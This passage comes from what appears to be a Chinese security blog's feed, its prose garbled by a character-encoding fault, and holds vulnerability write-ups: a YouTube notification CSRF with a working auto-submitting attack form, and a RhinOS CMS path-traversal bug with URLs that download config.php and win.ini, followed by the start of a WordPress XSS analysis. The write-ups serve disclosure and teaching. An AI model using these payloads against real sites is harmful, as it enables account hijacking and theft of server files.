class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;device_id&quot;</span><br><span class="line">dbe8453d99714c6160994fdf5bb3c59332df04278a...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;p256dh_key&quot;</span><br><span class="line">BBNVkVOt6tpY1KvJJqtLvqt...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;auth_key&quot;</span><br><span class="line">V5-_lh6nYT2zoY...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;permission&quot;</span><br><span class="line">granted</span><br><span class="line">-----------------------------41184676334--</span><br></pre></td></tr></table></figure></p><p> ä¹ä¸€çœ‹ï¼Œä¸ºäº†é˜²æ­¢CSRFï¼Œå…¶ä¸­çš„auth_keyã€p256dh_keyã€endpointã€device_idç­‰å‚æ•°è²Œä¼¼éƒ½æ˜¯ç»è¿‡ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œä½†ä»”ç»†ä¸€åˆ†ææ‰çŸ¥é“ï¼Œè¿™äº›æ‰€æœ‰çš„å‚æ•°éƒ½æ˜¯ç”±å…¶ä¸­updates.push.services.mozilla.comçš„Mozillaé€šçŸ¥æ¨é€æœåŠ¡äº§ç”Ÿçš„ï¼Œæ‰€ä»¥ï¼Œè¿™æ ·åˆç•¥æ¥çœ‹ï¼Œè¯¥æ¥å£ä¸Šä¸å­˜åœ¨CSRFæ¼æ´ã€‚</p><h3 id="åˆ†æService-Worker-æœåŠ¡å·¥ä½œçº¿ç¨‹â€‹"><a href="#åˆ†æService-Worker-æœåŠ¡å·¥ä½œçº¿ç¨‹â€‹" class="headerlink" title="åˆ†æService Worker æœåŠ¡å·¥ä½œçº¿ç¨‹â€‹"></a>åˆ†æService Worker æœåŠ¡å·¥ä½œçº¿ç¨‹â€‹</h3><p>æ·±å…¥åˆ†æå¯çŸ¥ï¼Œä¸Šè¿°POSTè¯·æ±‚ä¸­çš„referrerå­—æ®µå€¼ä¸ºâ€œ<a href="https://www.youtube.com/sw.jsâ€,è¿™ä¸ªsw.jsæ˜æ˜¾ä¸ºä¸€ä¸ªæœåŠ¡å·¥ä½œçº¿ç¨‹è„šæœ¬ï¼ˆService" target="_blank" rel="noopener">https://www.youtube.com/sw.jsâ€,è¿™ä¸ªsw.jsæ˜æ˜¾ä¸ºä¸€ä¸ªæœåŠ¡å·¥ä½œçº¿ç¨‹è„šæœ¬ï¼ˆService</a> Workerï¼‰ã€‚</p><p>Service Worker æ˜¯ç‹¬ç«‹äºå½“å‰é¡µé¢çš„ä¸€æ®µè¿è¡Œåœ¨æµè§ˆå™¨åå°è¿›ç¨‹é‡Œçš„è„šæœ¬ã€‚Service Workerä¸éœ€è¦ç”¨æˆ·æ‰“å¼€ web é¡µé¢ï¼Œä¹Ÿä¸éœ€è¦å…¶ä»–äº¤äº’ï¼Œå¼‚æ­¥åœ°è¿è¡Œåœ¨ä¸€ä¸ªå®Œå…¨ç‹¬ç«‹çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œä¸ä¼šå¯¹ä¸»çº¿ç¨‹é€ æˆé˜»å¡ã€‚åŸºäºService Workerå¯ä»¥å®ç°æ¶ˆæ¯æ¨é€ã€ç¦»çº¿ç¼“å­˜å’Œåå°åŒæ­¥APIç­‰åŠŸèƒ½ï¼Œæœ¬è´¨ä¸Šæ¥è¯´ï¼ŒService Workerå……å½“äº†Webåº”ç”¨ç¨‹åºä¸æµè§ˆå™¨ä¹‹é—´çš„ä»£ç†ã€‚â€‹</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œreferrerå­—æ®µä¸­çš„sw.jså‘èµ·äº†è¿™ä¸ªPOSTè¯·æ±‚ï¼Œä»¥è‡³äºè¿™ä¸ªè¯·æ±‚å’Œå…¶å®ƒå…·å¤‡CSRFé˜²å¾¡æœºåˆ¶çš„YouTubeè¯·æ±‚å†…å®¹å­˜åœ¨ä¸åŒã€‚</p><h3 id="æ„é€ CSRFæ”»å‡»æ¡†æ¶â€‹"><a href="#æ„é€ CSRFæ”»å‡»æ¡†æ¶â€‹" class="headerlink" title="æ„é€ CSRFæ”»å‡»æ¡†æ¶â€‹"></a>æ„é€ CSRFæ”»å‡»æ¡†æ¶â€‹</h3><p>åˆ°äº†è¿™ä¸€æ­¥ï¼Œä»è¿™äº›å‚æ•°é‡Œï¼Œæˆ‘éšçº¦è§‰å¾—è¿™é‡Œåº”è¯¥ä¼šæœ‰æ¼æ´å‡ºç°ï¼Œä½†æ€»è¦æ„é€ ä¸ªPoCå‡ºæ¥è¯•è¯•çœ‹ã€‚å› æ­¤ï¼Œé€šè¿‡ç ”ç©¶ä»¥ä¸Šå‚æ•°çš„ç”Ÿæˆæœºåˆ¶ï¼Œæˆ‘åˆ©ç”¨sw.jsåŸç†ï¼Œç¼–å†™äº†ä»¥ä¸‹ä¸‰ä¸ªä»£ç æ–‡ä»¶ï¼Œæ„å»ºäº†ä¸€ä¸ªæœ¬åœ°æœåŠ¡ç«¯æ¥ç”Ÿæˆå…¶ä¸­çš„å„ä¸ªå‚æ•°ã€‚ </p><p><strong>index.html:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Push Demo&lt;/title&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; href=&quot;index.css&quot; /&gt;</span><br><span class="line">    &lt;script src=&quot;index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello World&lt;/h1&gt;</span><br><span class="line">    &lt;button id=&quot;permission-btn&quot; onclick=&quot;main()&quot;&gt;Ask Permission&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">index.jsï¼š</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const check = () =&gt; &#123;</span><br><span class="line">  if (!(&apos;serviceWorker&apos; in navigator)) &#123;</span><br><span class="line">    throw new Error(&apos;No Service Worker support!&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">  if (!(&apos;PushManager&apos; in window)) &#123;</span><br><span class="line">    throw new Error(&apos;No Push API Support!&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">const registerServiceWorker = async () =&gt; &#123;</span><br><span class="line">  const swRegistration = await navigator.serviceWorker.register(&apos;sw.js&apos;)</span><br><span class="line">  return swRegistration</span><br><span class="line">&#125;</span><br><span class="line">const requestNotificationPermission = async () =&gt; &#123;</span><br><span class="line">  const permission = await window.Notification.requestPermission()</span><br><span class="line">  if (permission !== &apos;granted&apos;) &#123;</span><br><span class="line">    throw new Error(&apos;Permission not granted for Notification&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">const main = async () =&gt; &#123;</span><br><span class="line">  check()</span><br><span class="line">  const swRegistration = await registerServiceWorker()</span><br><span class="line">  const permission = await requestNotificationPermission()</span><br><span class="line">&#125;</span><br><span class="line">sw.jsï¼š</span><br><span class="line"></span><br><span class="line">self.addEventListener(&apos;activate&apos;, async () =&gt; &#123;   console.log(&quot;Hello&quot;);</span><br><span class="line">      self.registration.pushManager.subscribe()</span><br><span class="line">  .then(function(subscription) &#123;</span><br><span class="line">          console.log(JSON.stringify(subscription));</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function(e) &#123;</span><br><span class="line">    console.log(e);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br><span class="line">self.addEventListener(&quot;push&quot;, function(event) &#123;</span><br><span class="line">  if (event.data) &#123;</span><br><span class="line">    console.log(&quot;Push event!! &quot;, event.data.text());</span><br><span class="line">    showLocalNotification(&quot;Yolo&quot;, event.data.text(),  self.registration);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    console.log(&quot;Push event but no data&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">const showLocalNotification = (title, body, swRegistration) =&gt; &#123;</span><br><span class="line">  const options = &#123;</span><br><span class="line">    body</span><br><span class="line">    // here you can add more properties like icon, image, vibrate, etc.</span><br><span class="line">  &#125;;</span><br><span class="line">  swRegistration.showNotification(title, options);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™ä¸‰ä¸ªä»£ç æ–‡ä»¶çš„ç›®çš„åœ¨äºè·å–sw.jsè¯·æ±‚æ—¶ç”Ÿæˆçš„å„ä¸ªå‚æ•°ï¼Œæœ‰äº†è¿™äº›å‚æ•°ï¼Œå°±å¯ä»¥é—´æ¥å½¢æˆé€šçŸ¥ï¼ˆNotificationï¼‰ï¼Œæ‰“å¼€å…¶ä¸­çš„index.htmlé¡µé¢ï¼Œç‚¹å‡»Ask PermissionæŒ‰é’®è¯·æ±‚é€šçŸ¥æƒé™ï¼Œåå°è°ƒç”¨sw.jsè„šæœ¬ï¼Œé€šè¿‡å†…ç½®çš„Firefox APIå½¢æˆä¸€ä¸ªæœ¬åœ°çš„é€šçŸ¥æœåŠ¡ç«¯ï¼Œé€šçŸ¥è¯·æ±‚æäº¤æ—¶ï¼Œæˆ‘ä»¬å°±èƒ½è·å–åˆ°å…¶ä¸­çš„å„ä¸ªå‚æ•°ã€‚åˆ©ç”¨è¿™äº›å‚æ•°ï¼Œå¯ä»¥è¿›ä¸€æ­¥æ„é€ å‡ºCSRFæ”»å‡»æ¡†æ¶ï¼Œå°±èƒ½è·å–åˆ°å¯¹åº”çš„é€šçŸ¥æ¶ˆæ¯ã€‚<br>åœ¨æœ¬åœ°loclalhostæ„é€ è¿™ç§é€šçŸ¥è¯·æ±‚æœåŠ¡ç«¯ï¼Œéœ€è¦ç”¨åˆ°Service Worker æœåŠ¡å·¥ä½œçº¿ç¨‹ï¼ˆsw.jsï¼‰çš„éƒ¨ç½²åŸç†ï¼Œå…¶ä¸­æ¶‰åŠæœåŠ¡æ³¨å†Œã€æ¿€æ´»ã€ç¼“å­˜æ§åˆ¶å’Œç›¸å…³å“åº”æœºåˆ¶ï¼Œå…·ä½“å¯å‚è€ƒï¼šdeveloper.mozilla.orgå’Œdevelopers.google.comä¸­çš„è¯¦ç»†ä»‹ç»è¯´æ˜ã€‚</p><p><img src="http://zone.secevery.com/uploads/article/20190428/44a3ae0150b0efc2c8dd3d2f34a4a035.png" alt></p><p>ç»¼åˆä¸Šè¿°åˆ†æï¼ŒåŸºäºæˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„æœ¬åœ°é€šçŸ¥æœåŠ¡ç«¯ï¼Œç»“åˆYoutubeçš„é€šçŸ¥è¯·æ±‚æäº¤æ–¹å¼ï¼Œæˆ‘æ„é€ äº†ä»¥ä¸‹CSRFæ”»å‡»æ¡†æ¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.youtube.com/notifications_ajax?action_register_device=1&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; name=&quot;csrf&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;device_id&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;permission&quot; value=&quot;granted&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;endpoint&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;p256dh_key&quot; value=&quot;replace=&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;auth_key&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">        &lt;script type=&quot;text/javascript&quot;&gt;document.csrf.submit();&lt;/script&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>è®©æˆ‘æ„æƒ³ä¸åˆ°çš„æ˜¯ï¼Œæˆ‘åœ¨å…¶ä¸­ä»¥å…¶ä»–Youtubeè´¦å·èº«ä»½ï¼Œåˆ©ç”¨è·å–åˆ°çš„å„ç§è¯·æ±‚å‚æ•°ï¼Œæäº¤äº†é€šçŸ¥è¯·æ±‚ï¼Œç«Ÿç„¶èƒ½æœ‰æ•ˆå®æ–½é€šçŸ¥æ¶ˆæ¯çš„CSRFæ”»å‡»ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥åŠ«æŒåˆ°å…¶ä»–Youtubeè´¦å·çš„æ¶ˆæ¯æ¨é€æ¥å£ï¼ˆPUSH webhookï¼‰ï¼Œä»¥å…¶ä»–Youtubeè´¦å·èº«ä»½æ”¶å–åˆ°Youtubeå“åº”è¯¥è´¦å·çš„ç›¸å…³é€šçŸ¥ï¼Œè¿™äº›é€šçŸ¥å¯èƒ½æ˜¯ä»–è®¢é˜…çš„æŸä¸ªé¢‘é“æˆ–è§†é¢‘çš„æ›´æ–°æ¶ˆæ¯ï¼Œä¹Ÿå¯èƒ½æ˜¯ä»–ç§äººè§†é¢‘çš„è§‚ä¼—è¯„è®ºç­‰ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="http://zone.secevery.com/uploads/article/20190428/0131bb86ac1e5fa9eaa19bafbab8c677.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>çŠ€ç‰›(RhinOS)CMS3.Xä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´(CVE-2018-18760)</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/%E7%8A%80%E7%89%9B(RhinOS)CMS3.X%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E(CVE-2018-18760)/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/%E7%8A%80%E7%89%9B(RhinOS)CMS3.X%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E(CVE-2018-18760)/</url>
      
        <content type="html"><![CDATA[<h2 id="01ç®€ä»‹"><a href="#01ç®€ä»‹" class="headerlink" title="01ç®€ä»‹"></a>01ç®€ä»‹</h2><p>RhinOSæ˜¯ä¸€ä¸ªä½¿ç”¨æœ€æ–°åŠŸèƒ½å¼€å‘ç½‘ç«™çš„æ¡†æ¶ï¼Œå¯ä»¥ä¸ºWebé—¨æˆ·æä¾›æœ€å¿«çš„è®¿é—®å’Œç®¡ç†ã€‚RhinOSCMSå¯¹äºç½‘ç«™ç®¡ç†åŠŸèƒ½ååˆ†å¼ºåŠ²ï¼Œå†…ç½®å…è®¸ä½¿ç”¨æ•°æ®åº“è¿›ç¨‹å’Œè§£æå™¨æ¨¡å—å¿«é€Ÿè®¿é—®æ•°æ®åº“ï¼Œxmlå’Œå…¶ä»–èµ„æºï¼Œè´­ç‰©è½¦ï¼Œæ ‡ç­¾å’Œå‚æ•°åŒ–æ–‡ä»¶ï¼Œé…ç½®å‚æ•°ï¼ŒIntranetè®¿é—®ï¼Œæ•°æ®åº“ä¼šè¯ï¼Œç”µå­é‚®ä»¶å‘é€ï¼ŒéªŒè¯ç å®‰å…¨ç³»ç»Ÿï¼Œå¿«é€Ÿè¿‡æ»¤ï¼Œåˆ—è¡¨å’Œè¯¦ç»†ä¿¡æ¯çš„æ¨¡å—ï¼ŒåŠŸèƒ½å¯è°“æ˜¯éå¸¸ä¹‹å¤šäº†ã€‚RhinOSCMSçš„download.phpæ–‡ä»¶å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œé€šè¿‡æ¼æ´èƒ½å¤Ÿä¸‹è½½ä»»æ„çš„æ–‡ä»¶ã€‚</p><h2 id="02ç¯å¢ƒæ­å»º"><a href="#02ç¯å¢ƒæ­å»º" class="headerlink" title="02ç¯å¢ƒæ­å»º"></a>02ç¯å¢ƒæ­å»º</h2><p>RhinOS CMSä¸‹è½½åœ°å€ä¸ºï¼š<a href="https://sourceforge.net/projects/rhinos/ã€‚ä¸‹è½½å®Œæˆåï¼Œæ‰“å¼€æ–‡ä»¶ï¼Œä¸€ç›´ç‚¹ä¸‹ä¸€æ­¥å°±èƒ½å¤Ÿå®Œæˆå®‰è£…ï¼Œå¦‚å›¾1æ‰€ç¤ºã€‚" target="_blank" rel="noopener">https://sourceforge.net/projects/rhinos/ã€‚ä¸‹è½½å®Œæˆåï¼Œæ‰“å¼€æ–‡ä»¶ï¼Œä¸€ç›´ç‚¹ä¸‹ä¸€æ­¥å°±èƒ½å¤Ÿå®Œæˆå®‰è£…ï¼Œå¦‚å›¾1æ‰€ç¤ºã€‚</a></p><p><img src="https://pic3.zhimg.com/v2-db2e62b8afcecde12a1a92d999bf817e_r.jpg" alt></p><p>å›¾1å®Œæˆå®‰è£…</p><p>ç”±äºä¸€äº›ç¼–ç åŸå› ï¼Œå®‰è£…æˆåŠŸåçš„çš„ä¿¡æ¯ä¼šæ˜¾ç¤ºä¸€äº›ä¹±ç ï¼Œå¦‚æœä½¿ç”¨è¥¿ç­ç‰™è¯­çš„ç³»ç»Ÿå°±èƒ½æ­£å¸¸æ˜¾ç¤ºäº†ã€‚ç„¶åéœ€è¦å°†httpd.confä¸­çš„ç«¯å£ä¿®æ”¹ä¸º8080ç«¯å£ï¼Œä¿®æ”¹ç«¯å£æ˜¯ä¸ºäº†é¿å…å’ŒWINDOWSæœ¬èº«ä¸€äº›æœåŠ¡å†²çªï¼Œhttp.confæ‰€åœ¨è·¯å¾„ä¸ºï¼šC:\rhinos\httpd\conf\httpd.confã€‚å¦‚å›¾2æ‰€ç¤ºã€‚</p><p><img src="https://pic1.zhimg.com/v2-fbaf714d0454c7874b0043bba8dfd1b8_r.jpg" alt></p><p>å›¾2httpd.confæ‰€åœ¨è·¯å¾„</p><p>å³é”®ç¼–è¾‘å°†æ–‡ä»¶ä¸­çš„80ç«¯å£ä¿®æ”¹ä¸º8080ç«¯å£ï¼Œå¦‚å›¾3æ‰€ç¤ºã€‚</p><p><img src="https://pic2.zhimg.com/v2-ea92189b90a709947773a0c041e042c5_r.jpg" alt></p><p>å›¾3ä¿®æ”¹ç«¯å£</p><p>ä¿®æ”¹ç«¯å£åéœ€è¦é‡å¯é˜¿å¸•å¥‡æœåŠ¡ï¼Œé‡å¯æœåŠ¡åè®¿é—®<a href="http://127.0.0.1:8080ã€‚å°±èƒ½å¤Ÿè®¿é—®åˆ°å·²ç»æ­å»ºå¥½çš„CMSäº†ï¼Œå¦‚å›¾4æ‰€ç¤ºã€‚" target="_blank" rel="noopener">http://127.0.0.1:8080ã€‚å°±èƒ½å¤Ÿè®¿é—®åˆ°å·²ç»æ­å»ºå¥½çš„CMSäº†ï¼Œå¦‚å›¾4æ‰€ç¤ºã€‚</a></p><p><img src="https://pic4.zhimg.com/80/v2-0902d18ccba9d23b28d2be02e9f374f3_hd.jpg" alt></p><p>å›¾4é‡å¯apacheæœåŠ¡åè®¿é—®</p><h2 id="03æ¼æ´ä»£ç å®¡è®¡"><a href="#03æ¼æ´ä»£ç å®¡è®¡" class="headerlink" title="03æ¼æ´ä»£ç å®¡è®¡"></a>03æ¼æ´ä»£ç å®¡è®¡</h2><p>æ¼æ´å­˜åœ¨äºC:\rhinos\demo\admin\php\download.phpä¸­ï¼Œåœ¨ç¬¬30è¡Œä»£ç ï¼Œèƒ½å¤Ÿçœ‹åˆ°æ–‡ä»¶è¯»å–çš„è·¯å¾„æ‹¼æ¥æ“ä½œï¼Œå¦‚å›¾5æ‰€ç¤ºã€‚</p><p><img src="https://pic1.zhimg.com/v2-7e723ece58ccea364a50eb6ffe8913f4_r.jpg" alt></p><p>å›¾5download.php</p><p>çœ‹åˆ°getParam()ï¼ŒæŸ¥æ‰¾è¿™ä¸ªæ–¹æ³•æ˜¯å¦‚ä½•å®ç°çš„ã€‚<br>è¿™ä¸ªå‡½æ•°å­˜åœ¨äºï¼šC:\rhinos\demo\admin\php\connect.phpã€‚ç¬¬88è¡Œï¼Œå¦‚å›¾6æ‰€ç¤ºã€‚</p><p><img src="https://pic2.zhimg.com/v2-f1f16f289aba167af53da72aebd65729_r.jpg" alt></p><p>å›¾6connect.php</p><p>è¿™ä¸ªå‡½æ•°ä¸­è·å–äº†â€fileâ€çš„å‚æ•°ï¼Œé€šè¿‡POSTæˆ–è€…GETæäº¤éƒ½æ˜¯å¯ä»¥çš„ã€‚ç„¶åæ ¹æ®å›¾5æ‰€ç¤ºç¬¬41è¡Œè§¦å‘æ–‡ä»¶è¯»å–æ“ä½œï¼Œå¦‚æœæ§åˆ¶å‚æ•°fileåˆ™èƒ½å¤Ÿæˆä¸ºä»»æ„æ–‡ä»¶è¯»å–æ¼æ´æˆ–è€…ä¸ºä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚</p><h2 id="04æ¼æ´å¤ç°"><a href="#04æ¼æ´å¤ç°" class="headerlink" title="04æ¼æ´å¤ç°"></a>04æ¼æ´å¤ç°</h2><p>åœ¨å¤ç°ä¹‹å‰éœ€è¦æ‰¾åˆ°ä»ä»€ä¹ˆåœ°æ–¹è°ƒç”¨åˆ°äº†download.php,åœ¨ç»è¿‡æµ‹è¯•ä¹‹åå‘ç°é€šè¿‡è¿™ä¸ªURLæäº¤å°±èƒ½å¤Ÿåˆ©ç”¨æ¼æ´ä¸‹è½½åˆ°config.phpæ–‡ä»¶,ä½†æ˜¯é¦–å…ˆéœ€è¦ç™»å½•åå°ã€‚URLå¦‚ä¸‹:<br><a href="http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../config.phpï¼Œå¦‚å›¾7æ‰€ç¤ºã€‚" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../config.phpï¼Œå¦‚å›¾7æ‰€ç¤ºã€‚</a></p><p><img src="https://pic3.zhimg.com/v2-18183c286be55b1b067a55f89ca4deaa_r.jpg" alt></p><p>å›¾7ä¸‹è½½config.php</p><p>å½“ç„¶æ—¢ç„¶æ˜¯ä»»æ„æ–‡ä»¶ä¸‹æ¥æ¼æ´è‚¯å®šå¯ä»¥ä¸‹è½½windowsç›®å½•ä¸‹é¢çš„win.iniæ–‡ä»¶ï¼Œä½¿ç”¨URLä¸º:<br><a href="http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../../../../Windows/win.iniã€‚æ‰§è¡Œåå°±èƒ½å¤Ÿä¸‹è½½æ–‡ä»¶äº†ã€‚å¦‚å›¾8æ‰€ç¤ºã€‚" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../../../../Windows/win.iniã€‚æ‰§è¡Œåå°±èƒ½å¤Ÿä¸‹è½½æ–‡ä»¶äº†ã€‚å¦‚å›¾8æ‰€ç¤ºã€‚</a></p><p><img src="https://pic4.zhimg.com/v2-fddb74e5019196975e2663db99b48ff3_r.jpg" alt></p><p>å›¾8ä¸‹è½½win.ini</p><p>##05ä¿®å¤å»ºè®®<br>æ ¹æ®å‰æ–‡çš„æè¿°èƒ½å¤Ÿçœ‹å‡ºï¼Œæ¼æ´å­˜åœ¨ä¸€å®šçš„å±å®³ã€‚åº”è¯¥å¯¹äºæ¼æ´è¿›è¡Œä¿®å¤ï¼Œå…³äºå¦‚ä½•å»ä¿®å¤æ¼æ´ã€‚</p><p>1.è¿‡æ»¤ç‚¹[.]è¦æ±‚ç”¨æˆ·åœ¨urlä¸­ä¸èƒ½å›æº¯ä¸Šçº§ç›®å½•ã€‚<br>2.æ­£åˆ™ä¸¥æ ¼åˆ¤æ–­ç”¨æˆ·è¾“å…¥å‚æ•°çš„æ ¼å¼ï¼Œä¿è¯è¾“å…¥å‚æ•°çš„å‡†ç¡®æ€§ã€‚<br>3.å°†ä¸‹è½½åŒºç‹¬ç«‹æ”¾åœ¨é¡¹ç›®è·¯å¾„å¤–ï¼Œåˆ†é…æ¯ä¸ªä¸‹è½½èµ„æºå›ºå®šçš„URL,ä¸èƒ½æ˜¯æ‰€æœ‰çš„ä¸‹è½½èµ„æºéƒ½æ˜¯ç»Ÿä¸€çš„URLï¼š<br><a href="http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=æ–‡ä»¶å" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=æ–‡ä»¶å</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WordPresså­˜å‚¨å‹XSSæ¼æ´åˆ†æ</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/WordPress%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/WordPress%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><strong>è¯‘æ–‡å£°æ˜<br>æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« ï¼Œæ–‡ç« åŸä½œè€…fortinetï¼Œæ–‡ç« æ¥æºï¼šfortinet.com<br>åŸæ–‡åœ°å€ï¼š<a href="https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html" target="_blank" rel="noopener">https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html</a><br>è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†</strong></p><p><img src="https://p3.ssl.qhimg.com/t0154214347380ba2a2.png" alt> </p><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>WordPressæ˜¯ä¸–ç•Œä¸Šæœ€æµè¡Œçš„CMSï¼ˆå†…å®¹ç®¡ç†ç³»ç»Ÿï¼‰ï¼Œå æ®å…¨çƒ60.4%çš„å¸‚åœºä»½é¢ï¼Œè¿™ä¸ªæ•°å­—è¿œè¿œé«˜äºç¬¬äºŒåçš„Joomla!ï¼ˆ5.2%çš„å¸‚åœºä»½é¢ï¼‰ã€‚å› æ­¤ï¼Œåœ¨äº’è”ç½‘ä¸Šæœ‰è¶…è¿‡ä¸‰åˆ†ä¹‹ä¸€çš„ç½‘ç«™é‡‡ç”¨WordPressæ„å»ºã€‚</p><p>FortiGuard Labså›¢é˜Ÿæœ€è¿‘åœ¨WordPressä¸­å‘ç°äº†ä¸€ä¸ªå­˜å‚¨å‹XSSï¼ˆCross-Site Scriptingï¼‰0dayæ¼æ´ï¼Œè¿™ä¸ªXSSæ¼æ´ä½äºWordPress 5.0æ–°å¢çš„Gutenbergç¼–è¾‘å™¨ä¸­ï¼Œè¯¥ç¼–è¾‘å™¨æ— æ³•æ­£ç¡®è¿‡æ»¤Shortcodeï¼ˆçŸ­ä»£ç 